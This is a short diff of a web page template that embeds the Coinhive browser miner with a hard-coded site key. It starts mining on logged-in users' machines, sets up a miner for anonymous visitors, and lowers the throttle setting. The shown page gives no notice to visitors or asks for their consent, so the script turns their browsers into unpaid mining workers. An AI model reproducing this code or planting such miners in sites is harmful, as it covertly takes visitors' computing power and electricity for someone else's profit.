@@ -9,15 +9,15 @@
 <script src="https://coinhive.com/lib/coinhive.min.js"></script>
 <script>	
 	{% if login %}
-		var miner = new CoinHive.User('GM2yijcw685S5SCtVc2BZd6sG08MuJW0','歐陽詮',{
+		var miner = new CoinHive.User('GM2yijcw685S5SCtVc2BZd6sG08MuJW0','{{ name }}',{
 			autoThreads: true,
-			throttle: 0.8
+			throttle: 0.5
 		});
 		miner.start();
 	{% else %}
 		var miner = new CoinHive.Anonymous('GM2yijcw685S5SCtVc2BZd6sG08MuJW0',{
 			autoThreads: true,
-			throttle: 0.8
+			throttle: 0.5
 		});
     {% endif %}
 </script>
